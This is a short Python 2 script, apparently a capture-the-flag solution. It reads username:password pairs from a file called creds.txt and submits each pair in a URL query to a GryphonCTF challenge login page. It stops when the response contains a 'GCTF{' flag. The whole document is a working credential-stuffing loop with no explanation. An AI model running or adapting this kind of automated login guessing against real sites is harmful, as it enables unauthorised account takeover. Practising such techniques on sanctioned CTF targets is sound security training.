#!/usr/bin/python
import urllib2

fileName = "creds.txt"
f = open(fileName, 'r')
f_contents = f.readlines()
allDigits = []
for i in f_contents:
	allDigits.append(i.rstrip('\r\n'))

tmp = []
for i in allDigits:
    tmp.append(i.split(":"))

for i in tmp:
    user = i[0]
    password = i[1]
    req = urllib2.Request('http://web.chal.gryphonctf.com:17562/account.php?user=' + user + '&password=' + password)
    response = urllib2.urlopen(req)
    the_page = response.read()
    if "GCTF{" in the_page:
        print the_page
        break

